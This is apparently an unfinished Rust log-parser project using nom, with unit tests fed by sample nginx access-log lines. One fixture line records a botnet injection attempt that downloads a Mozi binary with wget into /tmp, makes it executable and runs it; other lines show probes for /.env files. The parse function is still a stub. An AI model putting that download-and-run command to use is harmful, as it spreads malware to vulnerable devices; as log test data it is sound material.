use std::{collections::HashMap};
use nom::{bytes::complete::*, IResult, sequence::*, branch::alt, combinator::eof, multi::length_value};

fn main() {
    println!("Hello, world!");
}

// #[derive(Debug)] //allows {:?} to print the entire struct
// struct Format {

// }

fn until_space(input: &str) -> IResult<&str, &str> {
    alt(
        (take_until(" "),take_until("\n"))
    )(input)
}

fn until_end(input: &str) -> IResult<&str, &str> {
    let len = input.len();
    Ok(("",&input[0..len]))
}

fn until_delimiter<'a>(input: &'a str, delimiter: &str) -> IResult<&'a str, &'a str> {
    take_until(delimiter)(input)
}

fn get_delimited<'a>(input: &'a str, delimiter: &str) -> IResult<&'a str, &'a str> {
    preceded(tag(delimiter),take_until(delimiter))(input)
}

fn parse(log_format: &str, log_string: &str) -> HashMap<String, String> {
    let mut log_message = HashMap::new();
    return log_message;
}


#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_until_space() {
        assert_eq!(until_space("135.125.244.48 -"),Ok((" -","135.125.244.48")));
        assert_eq!(until_space("135.125.244.48\n"),Ok(("\n","135.125.244.48")));
    }

    #[test]
    fn test_until_end() {
        assert_eq!(until_end("135.125.244.48 -"),Ok(("","135.125.244.48 -")));
    }

    #[test]
    fn test_until_delimiter() {
        assert_eq!(
            until_delimiter(r#" "GET /.env HTTP/1.1" 404"#, r#"""#),
            Ok((r#""GET /.env HTTP/1.1" 404"#, " "))
        );
    }

    #[test]
    fn test_get_delimited() {
        assert_eq!(
            get_delimited(r#""GET /.env HTTP/1.1" 404"#, r#"""#),
            Ok(("\" 404", "GET /.env HTTP/1.1"))
        );
    }

    #[test]
    fn test_parse() {
        let log_format = r#"$remote_addr - $remote_user [$time_local] "$request" $status $body_bytes_sent "$http_referer" "$http_user_agent""#;
        let multi_log_string = r#"
        135.125.244.48 - - [15/Apr/2022:13:47:18 +0000] "GET /.env HTTP/1.1" 404 1371 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
        185.82.218.64 - - [15/Apr/2022:13:53:42 +0000] "GET /.env HTTP/1.0" 404 3014 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36"
        167.71.134.212 - - [15/Apr/2022:14:04:30 +0000] "\xE6T\xA1\x12)\x05\x1D\xF6\xED\xAD\x84M\x10\xF5\x9Cj\xE1\x87\xB2\xF6\xC2#\xAF}\x90\x8D\xB3M\xB0:\xB7\xF9W\xEA\xF0\xBDc\x07\xC8Z\xC9p\x83\x1A%\xDD\xC6\x5C\x81\x91\xFD\xBAX7u\xE3\x80\xE8\xFCd\x9C\x93l&\xF2bDBr" 400 172 "-" "-"
        185.254.196.115 - - [15/Apr/2022:14:27:16 +0000] "GET /.env HTTP/1.1" 404 1371 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
        185.254.196.115 - - [15/Apr/2022:14:27:17 +0000] "POST / HTTP/1.1" 404 1378 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
        220.123.14.232 - - [15/Apr/2022:14:39:32 +0000] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 172 "-" "-"
        92.118.36.208 - - [15/Apr/2022:15:00:35 +0000] "GET / HTTP/1.1" 200 1609 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36"
        212.115.42.251 - - [15/Apr/2022:15:12:01 +0000] "GET / HTTP/1.1" 200 1609 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36"
        135.125.244.48 - - [15/Apr/2022:15:15:34 +0000] "POST / HTTP/1.1" 404 1378 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
        135.125.244.48 - - [15/Apr/2022:15:15:35 +0000] "GET /.env HTTP/1.1" 404 1371 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36""#;
        let log_string = r#"185.254.196.115 - - [15/Apr/2022:14:27:16 +0000] "GET /.env HTTP/1.1" 404 1371 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36""#;

        let log_message = parse(log_format, log_string);
        assert_eq!(log_message.len(),9);
        assert_eq!(log_message["remote_addr"],"185.254.196.115");
        assert_eq!(log_message["remote_user"],"-");
        assert_eq!(log_message["time_local"],"15/Apr/2022:14:27:16 +0000");
        assert_eq!(log_message["request"],"GET /.env HTTP/1.1");
        assert_eq!(log_message["status"],"404");
        assert_eq!(log_message["body_bytes_sent"],"1371");
        assert_eq!(log_message["http_referer"],"-");
        assert_eq!(log_message["http_user_agent"],"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36");
    }
}